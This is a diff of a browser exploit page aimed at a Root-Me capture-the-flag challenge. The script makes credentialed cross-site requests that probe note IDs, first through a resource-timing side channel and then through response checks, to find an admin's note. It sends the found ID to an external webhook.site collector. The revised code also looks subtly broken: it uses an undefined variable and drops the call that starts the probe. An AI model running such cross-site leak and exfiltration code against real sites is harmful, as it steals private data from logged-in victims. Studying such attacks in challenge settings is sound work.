@@ -5,43 +5,32 @@
 const WEBHOOK = "https://webhook.site/04ff6bdb-7cda-4c12-b9a3-be41cf998864";
 const TARGET = "https://web-client-ch56.challenge01.root-me.org:58056/notes/";
 const START_ID = 0;
-const MAX_ID = 10000;
-const DELAY_MS = 0;
 
 let current = START_ID;
 let active = false;
 let found = false;
 
-function tryId(id) {
-    if (active || found) return;
-    active = true;
-
-    const url = TARGET + id + "?cb=" + Date.now();
-    fetch(url, { mode: 'no-cors', credentials: 'include' });
-
-    setTimeout(() => {
-        const entries = performance.getEntriesByName(url);
-        let size = 0;
-        if (entries.length > 0) {
-            size = entries[0].transferSize;
-            performance.clearResourceTimings();
-        }
-
-        console.log(`ID ${id}: transferSize = ${size}`);
-
-        if (size == 0) {
-            found = true;
-            fetch(WEBHOOK + "?admin_note=" + id, { mode: 'no-cors' });
-            console.log("Admin note found at ID", id);
+function tryId(i) {
+    fetch(TARGET + i, {
+        credentials: 'include'
+    })
+    .then(res => {
+        if (!res.ok) {
+            fetch(WEBHOOK + "?admin=" + id);
             return;
         }
-
-        active = false;
-        if (id < MAX_ID && !found) setTimeout(() => tryId(id + 1), DELAY_MS);
-    }, DELAY_MS);
+        return res.text(); 
+    })
+    .then(data => {
+        if (data) {
+            tryId(i + 1);
+        }
+    })
+    .catch(() => {
+        fetch(WEBHOOK + "?admin=" + id);
+    });
 }
 
-tryId(current);
 </script>
 </body>
 </html>
